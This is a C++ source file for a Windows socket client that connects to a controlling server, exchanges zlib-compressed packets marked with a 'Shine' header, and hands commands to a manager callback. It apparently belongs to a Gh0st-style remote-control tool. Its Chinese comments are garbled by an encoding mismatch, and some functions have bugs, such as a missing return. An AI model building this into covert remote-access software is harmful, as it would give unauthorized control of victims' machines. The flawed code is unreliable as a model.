// IOCPClient.cpp: implementation of the IOCPClient class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "IOCPClient.h"
#include <IOSTREAM>
#include "zconf.h"
#include "zlib.h"
using namespace std;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

VOID IOCPClient::setManagerCallBack(class CManager* Manager)
{
	m_Manager = Manager;
}


IOCPClient::IOCPClient()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	
	m_sClientSocket = INVALID_SOCKET;
	m_hWorkThread   = NULL;

	memcpy(m_szPacketFlag,"Shine",FLAG_LENGTH);

	m_bIsRunning = TRUE;

	m_hEvent = CreateEvent(NULL,TRUE,FALSE, NULL);  
}

IOCPClient::~IOCPClient()
{

	if (m_sClientSocket!=INVALID_SOCKET)
	{
		closesocket(m_sClientSocket);
		m_sClientSocket = INVALID_SOCKET;
	}


	if (m_hWorkThread!=NULL)
	{
		CloseHandle(m_hWorkThread);
		m_hWorkThread = NULL;
	}


	if (m_hEvent!=NULL)
	{
		CloseHandle(m_hEvent);
		m_hEvent = NULL;
	}
	WSACleanup();
}

BOOL IOCPClient::ConnectServer(char* szServerIP, unsigned short uPort)
{


	m_sClientSocket = socket(AF_INET,SOCK_STREAM, IPPROTO_TCP);    //�����
	
	if (m_sClientSocket == SOCKET_ERROR)   
	{ 
		return FALSE;   
	}

	//����sockaddr_in�ṹ Ҳ�������ض˵Ľṹ
	sockaddr_in	ServerAddr;
	ServerAddr.sin_family	= AF_INET;               //�����  IP
	ServerAddr.sin_port	= htons(uPort);	
	ServerAddr.sin_addr.S_un.S_addr = inet_addr(szServerIP);
	
	if (connect(m_sClientSocket,(SOCKADDR *)&ServerAddr,sizeof(sockaddr_in)) == SOCKET_ERROR) 
	{
		if (m_sClientSocket!=INVALID_SOCKET)
		{
			closesocket(m_sClientSocket);
			m_sClientSocket = INVALID_SOCKET;
		}
		return FALSE;
	}

/*	m_hWorkerThread = (HANDLE)_CreateThread(NULL, 0, 
		(LPTHREAD_START_ROUTINE)WorkThread,(LPVOID)this, 0, NULL, true);*/


	const char chOpt = 1; // True
	// Set KeepAlive �����������, ��ֹ����˲���������
	if (setsockopt(m_sClientSocket, SOL_SOCKET, SO_KEEPALIVE,
		(char *)&chOpt, sizeof(chOpt)) == 0)
	{
		// ���ó�ʱ��ϸ��Ϣ
		tcp_keepalive	klive;
		klive.onoff = 1; // ���ñ���
		klive.keepalivetime = 1000 * 60 * 3; // 3���ӳ�ʱ Keep Alive
		klive.keepaliveinterval = 1000 * 5;  // ���Լ��Ϊ5�� Resend if No-Reply
		WSAIoctl
			(
			m_sClientSocket, 
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&chOpt,
			0,
			NULL
			);
	}

	m_hWorkThread = (HANDLE)CreateThread(NULL, 0, 
		(LPTHREAD_START_ROUTINE)WorkThreadProc,(LPVOID)this, 0, NULL);
}



DWORD WINAPI IOCPClient::WorkThreadProc(LPVOID lParam)
{
	
	IOCPClient* This = (IOCPClient*)lParam;
	char	szBuffer[MAX_RECV_BUFFER] = {0};
	
	fd_set fdOld;
	fd_set fdNew;
	
	FD_ZERO(&fdOld);
	FD_ZERO(&fdNew);
	
	FD_SET(This->m_sClientSocket, &fdOld);  
	
	while (This->IsRunning())                //������ض� û���˳�����һֱ�������ѭ����
	{
		fdNew = fdOld;
		int iRet = select(NULL, &fdNew, NULL, NULL, NULL);   //�����ж��Ƿ�Ͽ�����
		if (iRet == SOCKET_ERROR)      
		{
			This->Disconnect();
			printf("�ر�1\r\n");
			break;
		}
		if (iRet > 0)
		{
			memset(szBuffer, 0, sizeof(szBuffer));
			int iReceivedLength = recv(This->m_sClientSocket,
				szBuffer,sizeof(szBuffer), 0);     //�������ض˷���������
			if (iReceivedLength <= 0)
			{
				int a = GetLastError();
				printf("�ر�2\r\n");
				This->Disconnect();//���մ�����
				break;
			}
			if (iReceivedLength > 0) 
			{
				This->OnServerReceiving((char*)szBuffer, iReceivedLength);   //��ȷ���վ͵��� OnRead���� ת��OnRead
			}
		}
	}
	
	return 0;
}


VOID IOCPClient::OnServerReceiving(char* szBuffer, ULONG ulLength)
{

//	m_CompressedBuffer.ClearBuffer();
	try
	{
		if (ulLength == 0)
		{
			Disconnect();       //������
			return;
		}		
		//���½ӵ����ݽ��н�ѹ��
		m_CompressedBuffer.WriteBuffer((LPBYTE)szBuffer, ulLength);
		
		
		
		//��������Ƿ��������ͷ��С ��������ǾͲ�����ȷ������
		while (m_CompressedBuffer.GetBufferLength() > HDR_LENGTH)
		{
			char szPacketFlag[FLAG_LENGTH] = {0};
			CopyMemory(szPacketFlag, m_CompressedBuffer.GetBuffer(),FLAG_LENGTH);
			//�ж�����ͷ
			if (memcmp(m_szPacketFlag, szPacketFlag, FLAG_LENGTH) != 0)
			{
				throw "Bad Buffer";
			}
			
			ULONG ulPackTotalLength = 0;
			CopyMemory(&ulPackTotalLength, m_CompressedBuffer.GetBuffer(FLAG_LENGTH), 
				sizeof(ULONG));
			
			//--- ���ݵĴ�С��ȷ�ж�
			if (ulPackTotalLength && 
				(m_CompressedBuffer.GetBufferLength()) >= ulPackTotalLength)
			{

			
				
				m_CompressedBuffer.ReadBuffer((PBYTE)szPacketFlag, FLAG_LENGTH);    //��ȡ����ͷ�� shine

				m_CompressedBuffer.ReadBuffer((PBYTE) &ulPackTotalLength, sizeof(ULONG));            
				
				ULONG ulOriginalLength = 0; 
				m_CompressedBuffer.ReadBuffer((PBYTE) &ulOriginalLength, sizeof(ULONG)); 


				//50  
				ULONG ulCompressedLength = ulPackTotalLength - HDR_LENGTH; 
				PBYTE CompressedBuffer = new BYTE[ulCompressedLength];              
                PBYTE DeCompressedBuffer = new BYTE[ulOriginalLength]; 
				
				if (CompressedBuffer == NULL || DeCompressedBuffer == NULL)
				{
					throw "bad Allocate";
				}
				
				m_CompressedBuffer.ReadBuffer(CompressedBuffer, ulCompressedLength);
				
	
				int	iRet = uncompress(DeCompressedBuffer, 
					&ulOriginalLength, CompressedBuffer, ulCompressedLength);
				
				
				if (iRet == Z_OK)//�����ѹ�ɹ�
				{
					m_DeCompressedBuffer.ClearBuffer();
					m_DeCompressedBuffer.WriteBuffer(DeCompressedBuffer,
						ulOriginalLength);
					
					//��ѹ�õ����ݺͳ��ȴ��ݸ�����Manager���д��� ע�����������˶�̬
					//����m_pManager�е����಻һ����ɵ��õ�OnReceive������һ��
			
					m_Manager->OnReceive((PBYTE)m_DeCompressedBuffer.GetBuffer(0),
						m_DeCompressedBuffer.GetBufferLength());
				}
				else
					throw "Bad Buffer";
				
				delete [] CompressedBuffer;
				delete [] DeCompressedBuffer;
			}
			else
				break;
		}
	}catch(...)
	{
		m_CompressedBuffer.ClearBuffer();
	}
	

}


int IOCPClient::OnServerSending(char* szBuffer, ULONG ulOriginalLength)  //Hello
{

	m_WriteBuffer.ClearBuffer();

	if (ulOriginalLength > 0)
	{
		//����1.001�������Ҳ��������ѹ����ռ�õ��ڴ�ռ��ԭ��һ�� +12 
		//��ֹ���������//  HelloWorld  10   22
		//����ѹ�� ѹ���㷨 ΢���ṩ
		//nSize   = 436
		//destLen = 448                             
		unsigned long	ulCompressedLength = (double)ulOriginalLength * 1.001  + 12;     
		LPBYTE			CompressedBuffer = new BYTE[ulCompressedLength]; 
		
		if (CompressedBuffer == NULL)
		{
			return 0;
		}
		
		int	iRet = compress(CompressedBuffer, &ulCompressedLength, (PBYTE)szBuffer, ulOriginalLength);   

		if (iRet != Z_OK)  
		{
			delete [] CompressedBuffer;
			return FALSE;
		}
		
		ULONG ulPackTotalLength = ulCompressedLength + HDR_LENGTH;    
	
	

		m_WriteBuffer.WriteBuffer((PBYTE)m_szPacketFlag, sizeof(m_szPacketFlag));  
	   	
		m_WriteBuffer.WriteBuffer((PBYTE) &ulPackTotalLength,sizeof(ULONG));   
		//  5      4
		//[Shine][ 30 ]	



		m_WriteBuffer.WriteBuffer((PBYTE)&ulOriginalLength, sizeof(ULONG));   	
		//  5      4    4
		//[Shine][ 30 ][5]	
	
		m_WriteBuffer.WriteBuffer(CompressedBuffer,ulCompressedLength); 
	

		delete [] CompressedBuffer;
		CompressedBuffer = NULL;		

	}
	// �ֿ鷢��
	//shine[0035][0010][HelloWorld+12]
	return SendWithSplit((char*)m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLength(), 
		MAX_SEND_BUFFER);
}

//  5    2   //  2  2  1
BOOL IOCPClient::SendWithSplit(char* szBuffer, ULONG ulLength, ULONG ulSplitLength)
{
	//1025
	int			 iReturn = 0;   //���������˶���
	const char*  Travel = (char *)szBuffer;
	int			 i = 0;
	ULONG		 ulSended = 0;
	ULONG		 ulSendRetry = 15;
	int          j = 0;
	// ���η���
     
	for (i = ulLength; i >= ulSplitLength; i -= ulSplitLength)
	{
		for (j = 0; j < ulSendRetry; j++)
		{     			
			iReturn = send(m_sClientSocket, Travel, ulSplitLength,0);
			if (iReturn > 0)
			{
				break;
			}
		}
		if (j == ulSendRetry)
		{
			return FALSE;
		}
		
		ulSended += iReturn;  
		Travel += ulSplitLength;   
		Sleep(15); //�����������ƶ����ݻ���
	}
	// �������Ĳ���
	if (i>0)  //1024
	{
		for (int j = 0; j < ulSendRetry; j++)   //nSendRetry = 15
		{
			iReturn = send(m_sClientSocket, (char*)Travel,i,0);

			Sleep(15);
			if (iReturn > 0)
			{
				break;
			}
		}
		if (j == ulSendRetry)
		{
			return FALSE;
		}
		ulSended += iReturn;   //0+=1000
	}
	if (ulSended == ulLength)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}


VOID IOCPClient::Disconnect() 
{

	CancelIo((HANDLE)m_sClientSocket);
	InterlockedExchange((LPLONG)&m_bIsRunning, FALSE);     //֪ͨ�����߳��˳����ź�
	closesocket(m_sClientSocket);
	
	SetEvent(m_hEvent);	
	
	
	
	m_sClientSocket = INVALID_SOCKET;
}


VOID IOCPClient::RunEventLoop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}